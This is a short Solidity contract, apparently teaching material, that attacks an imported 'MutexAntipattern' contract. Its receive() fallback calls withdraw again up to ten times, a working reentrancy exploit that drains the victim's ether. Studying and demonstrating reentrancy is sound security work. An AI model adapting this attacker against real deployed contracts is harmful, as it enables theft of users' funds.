// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

import './MutexAntipattern.sol';

contract AttackerAntiMutex {
  MutexAntipattern v;
  uint256 public count;
  uint amount = 1 ether;
  address payable public victimAddress; //payable?

  event LogFallback(uint c, uint balance);

  constructor (MutexAntipattern victim) {
    victimAddress = address(victim);
    v = MutexAntipattern(victimAddress);
  }

  receive() external payable {
    count++;
    emit LogFallback(count, address(this).balance);
    if (count < 10) {
      v.withdraw(amount);
    } 
  }

  function setBalance() public payable {
     victimAddress.call{value: msg.value}("");
  }

  function attack() public {
    v.withdraw(amount);
  }

}